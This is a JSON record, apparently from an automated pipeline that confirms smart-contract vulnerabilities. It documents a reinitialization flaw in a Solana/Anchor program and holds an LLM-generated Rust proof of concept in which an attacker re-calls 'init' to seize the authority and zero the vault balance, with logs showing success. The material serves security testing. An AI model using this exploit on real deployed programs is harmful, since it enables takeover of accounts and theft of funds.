@@ -1,0 +1,120 @@
+{
+  "category": "REINIT",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: authority sobrescrito pelo atacante; vault_balance zerado pelo ataque",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2404,
+        "completion_tokens": 775,
+        "latency_s": 4.72
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta Config já inicializada com authority = vítima e vault_balance = 1000, usando o baseline legítimo da instrução `init` (que sobrescreve com o authority do chamador e zera o saldo). Em seguida, o ataque chama a mesma instrução `init` passando a conta Config resultante do baseline e a conta do atacante como authority signer. Como não há checagem de is_initialized, o handler sobrescreve config.authority com a chave do atacante e zera vault_balance. Medimos o dano verificando que, após o ataque, o authority gravado na conta é o do atacante e o vault_balance foi zerado, estado que o uso legítimo não produziria sobre uma conta já inicializada.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet victim = Pubkey::new_unique();\\n\\n// Conta Config já inicializada com authority da vítima e saldo 1000\\nlet config_data = anchor_account_data(\\n    \\\"Config\\\",\\n    &(victim, true, 1000u64),\\n);\\nlet config_key = Pubkey::new_unique();\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\n// Baseline: uso legítimo da instrução init com a conta já existente\\nlet ix_baseline = env.anchor_ix(\\n    \\\"init\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new(victim, true),\\n    ],\\n);\\nlet contas_baseline = vec![\\n    (config_key, config_account.clone()),\\n    (victim, wallet(1_000_000_000)),\\n];\\nlet r_base = env.baseline(\\\"init legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Estado após o baseline: authority = victim, is_initialized = true, vault_balance = 0\\nlet config_pos_baseline = after(&r_base, &config_key).clone();\\n\\n// Ataque: mesma instrução init, mas com o atacante como authority\\nlet ix_attack = env.anchor_ix(\\n    \\\"init\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new(attacker, true),\\n    ],\\n);\\nlet contas_attack = vec![\\n    (config_key, config_pos_baseline),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"reinit sobrescreve authority\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &config_key).data();\\n    let authority_pos = read_pubkey(data, 8);\\n    let balance_pos = read_u64(data, 8 + 32 + 1);\\n    env.effect(\\n        \\\"authority sobrescrito pelo atacante\\\",\\n        authority_pos == attacker,\\n    );\\n    env.effect(\\n        \\\"vault_balance zerado pelo ataque\\\",\\n        balance_pos == 0,\\n    );\\n}\"\n}",
+      "plan": "Preparamos uma conta Config já inicializada com authority = vítima e vault_balance = 1000, usando o baseline legítimo da instrução `init` (que sobrescreve com o authority do chamador e zera o saldo). Em seguida, o ataque chama a mesma instrução `init` passando a conta Config resultante do baseline e a conta do atacante como authority signer. Como não há checagem de is_initialized, o handler sobrescreve config.authority com a chave do atacante e zera vault_balance. Medimos o dano verificando que, após o ataque, o authority gravado na conta é o do atacante e o vault_balance foi zerado, estado que o uso legítimo não produziria sobre uma conta já inicializada.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet victim = Pubkey::new_unique();\n\n// Conta Config já inicializada com authority da vítima e saldo 1000\nlet config_data = anchor_account_data(\n    \"Config\",\n    &(victim, true, 1000u64),\n);\nlet config_key = Pubkey::new_unique();\nlet config_account = account(&env.program_id, &config_data, None);\n\n// Baseline: uso legítimo da instrução init com a conta já existente\nlet ix_baseline = env.anchor_ix(\n    \"init\",\n    &(),\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new(victim, true),\n    ],\n);\nlet contas_baseline = vec![\n    (config_key, config_account.clone()),\n    (victim, wallet(1_000_000_000)),\n];\nlet r_base = env.baseline(\"init legitimo\", &ix_baseline, &contas_baseline);\n\n// Estado após o baseline: authority = victim, is_initialized = true, vault_balance = 0\nlet config_pos_baseline = after(&r_base, &config_key).clone();\n\n// Ataque: mesma instrução init, mas com o atacante como authority\nlet ix_attack = env.anchor_ix(\n    \"init\",\n    &(),\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new(attacker, true),\n    ],\n);\nlet contas_attack = vec![\n    (config_key, config_pos_baseline),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"reinit sobrescreve authority\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &config_key).data();\n    let authority_pos = read_pubkey(data, 8);\n    let balance_pos = read_u64(data, 8 + 32 + 1);\n    env.effect(\n        \"authority sobrescrito pelo atacante\",\n        authority_pos == attacker,\n    );\n    env.effect(\n        \"vault_balance zerado pelo ataque\",\n        balance_pos == 0,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo",
+            "result": "Success",
+            "compute_units": 8695,
+            "account_flags": "-w,sw",
+            "ix_head": "b5fd9d8a59e9f952",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg",
+                "data_len": 49,
+                "head": "9b0caae01efacc82",
+                "digest": "8e7ae526c5069f3c",
+                "post": "9b0caae01efacc820000000000000002000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinit sobrescreve authority",
+            "result": "Success",
+            "compute_units": 8656,
+            "account_flags": "-w,sw",
+            "ix_head": "b5fd9d8a59e9f952",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg",
+                "data_len": 49,
+                "head": "9b0caae01efacc82",
+                "digest": "f2275c28d6e12f29",
+                "post": "9b0caae01efacc820000000000000001000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority sobrescrito pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "vault_balance zerado pelo ataque",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 8695 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg success",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 8656 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: authority sobrescrito pelo atacante; vault_balance zerado pelo ataque"
+    }
+  ],
+  "case_id": "SSP-04-A-V",
+  "static_finding": {
+    "category": "REINIT",
+    "confidence": "high",
+    "evidence": "#[account(mut)]\npub config: Account<'info, Config>,\n...\nconfig.authority = ctx.accounts.authority.key();\nconfig.is_initialized = true;\nconfig.vault_balance = 0;",
+    "explanation": "A conta `config` e recebida como `Account<'info, Config>` com apenas a constraint `mut`, sem `init` nem `init_if_needed`. Isso significa que a conta ja deve existir e estar inicializada para a instrucao ser executada, mas o handler sobrescreve `authority`, `is_initialized` e `vault_balance` sem verificar se a conta ja foi inicializada anteriormente. O campo `is_initialized` existe na struct e um erro `AlreadyInitialized` esta declarado, mas nenhum dos dois e usado no handler. Assim, a instrucao `init` pode ser chamada repetidamente sobre uma conta ja inicializada, permitindo que um atacante sobrescreva a autoridade e o saldo do vault.",
+    "attack_hypothesis": "Um atacante chama novamente a instrucao `init` passando a conta `config` ja existente e sua propria conta como `authority` (assinante). Como nao ha checagem de `is_initialized`, o handler sobrescreve `config.authority` com a chave do atacante e zera `vault_balance`, assumindo o controle da configuracao e do vault."
+  }
+}
